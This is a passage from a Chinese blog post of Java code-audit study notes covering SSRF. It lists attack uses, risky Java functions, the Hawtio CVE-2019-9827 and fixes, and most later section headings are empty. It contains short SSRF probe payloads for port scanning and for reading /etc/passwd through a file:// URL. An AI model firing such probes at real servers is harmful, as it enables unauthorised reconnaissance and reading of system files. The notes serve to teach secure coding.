<h3 id="6-2-SSRF"><a href="#6-2-SSRF" class="headerlink" title="6.2 SSRF"></a>6.2 SSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server-Side Request Forge	服务器端请求伪造</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692433559434.png" alt="1692433559434"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用</span><br><span class="line">	扫描内网</span><br><span class="line">	向内部任意主机的任意端口发送精心构造的攻击paylaod</span><br><span class="line">	攻击内网的Web应用</span><br><span class="line">	读取文件</span><br><span class="line">	拒绝服务攻击</span><br><span class="line">出现的场景</span><br><span class="line">	在线翻译</span><br><span class="line">	转码服务</span><br><span class="line">	图片收藏/下载</span><br><span class="line">	信息收集</span><br><span class="line">	邮件系统或者从远程服务器请求资源</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">敏感函数</span><br><span class="line">	HttpClient.execute()</span><br><span class="line">	HttpClient.executeMethod()</span><br><span class="line">	HttpURLConnection.connect()</span><br><span class="line">	HttpURLConnection.getInputStream()</span><br><span class="line">	URL.openStream()</span><br><span class="line">	HttpServletRequest()</span><br><span class="line">	BasicHttpEntityEnclosingRequest()</span><br><span class="line">	DefaultEntityEnclosingRequest()</span><br><span class="line">	BasicHttpRequest()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端口扫描	文件读取</span><br><span class="line">?url=http://xxx:80</span><br><span class="line">?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692444488932.png" alt="1692444488932"></p>
<h5 id="CVE-2019-9827Hawtio"><a href="#CVE-2019-9827Hawtio" class="headerlink" title="CVE-2019-9827	Hawtio"></a>CVE-2019-9827	Hawtio</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hawtio是用于管理JAVA应用程序的轻型模块化控制台</span><br><span class="line">	&lt;2.5.0版本</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SSRF的修复</span><br><span class="line">	统一错误信息，避免用户根据错误信息来判断远端服务器的端口状态</span><br><span class="line">	限制请求的端口为http的常用端口，比如80、443、8080、8090</span><br><span class="line">	禁用不需要的协议，仅仅允许http和https请求</span><br><span class="line">	根据业务需求，判定所需的域名是否是常用的几个，若是，则将这句个特定的域名加入白名单，拒绝白名单之外的请求</span><br><span class="line">	根据请求来源，判定请求地址是否是固定请求来源，若是，...</span><br><span class="line">	若业务需求和请求来源并不固定，则可以自己编写ssrfCheck函数，检测特定域名，判定是否为内网IP、判断是否为http/https协议等</span><br></pre></td></tr></table></figure>



<h3 id="6-3-URL跳转"><a href="#6-3-URL跳转" class="headerlink" title="6.3 URL跳转"></a>6.3 URL跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-4-文件操作漏洞"><a href="#6-4-文件操作漏洞" class="headerlink" title="6.4 文件操作漏洞"></a>6.4 文件操作漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-5-Web后门"><a href="#6-5-Web后门" class="headerlink" title="6.5 Web后门"></a>6.5 Web后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-6-逻辑漏洞"><a href="#6-6-逻辑漏洞" class="headerlink" title="6.6 逻辑漏洞"></a>6.6 逻辑漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-7-前端配置不当"><a href="#6-7-前端配置不当" class="headerlink" title="6.7 前端配置不当"></a>6.7 前端配置不当</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-8-拒绝服务"><a href="#6-8-拒绝服务" class="headerlink" title="6.8 拒绝服务"></a>6.8 拒绝服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-9-点击劫持"><a href="#6-9-点击劫持" class="headerlink" title="6.9 点击劫持"></a>6.9 点击劫持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-10-参数污染"><a href="#6-10-参数污染" class="headerlink" title="6.10 参数污染"></a>6.10 参数污染</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-1-1-SSM框架审计技巧"><a href="#7-1-1-SSM框架审计技巧" class="headerlink" title="7.1.1 SSM框架审计技巧"></a>7.1.1 SSM框架审计技巧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-1-2-SSH框架审计技巧"><a href="#7-1-2-SSH框架审计技巧" class="headerlink" title="7.1.2 SSH框架审计技巧"></a>7.1.2 SSH框架审计技巧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-1-3-SpringBoot审计流程"><a href="#7-1-3-SpringBoot审计流程" class="headerlink" title="7.1.3 SpringBoot审计流程"></a>7.1.3 SpringBoot审计流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-2-开发框架使用不当范例-Struts远程代码执行"><a href="#7-2-开发框架使用不当范例-Struts远程代码执行" class="headerlink" title="7.2 开发框架使用不当范例(Struts远程代码执行)"></a>7.2 开发框架使用不当范例(Struts远程代码执行)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>


                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Hyy</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://huyaoyao2019.github.io/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">http://huyaoyao2019.github.io/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Hyy</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">您的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="一些知识点">
                        
                        <span class="card-title">一些知识点</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-20
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            hyy
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
                        <span class="chip bg-color">基础知识</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/07/20/%E5%8D%9A%E5%AE%A2%E5%A4%8D%E7%8E%B0/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="servlet 线程安全">
                        
                        <span class="card-title">servlet 线程安全</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-20
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
                                    学习笔记
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%A4%8D%E7%8E%B0/">
                        <span class="chip bg-color">博客复现</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>



<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">Hyy</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/huyaoyao2019" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1228876399@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1228876399" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1228876399" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.7'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
